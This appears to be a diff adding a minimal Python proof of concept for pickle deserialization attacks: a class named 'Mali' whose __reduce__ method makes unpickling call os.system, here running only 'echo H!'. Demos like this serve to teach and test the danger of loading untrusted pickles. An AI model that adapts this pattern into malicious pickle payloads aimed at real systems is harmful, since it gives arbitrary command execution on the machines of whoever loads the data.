@@ -1,0 +1,11 @@
+import pickle
+import os
+
+
+class Mali:
+    def __reduce__(self):
+        return (os.system, ('echo H!',))
+
+
+data = pickle.dumps(Mali())
+pickle.loads(data)
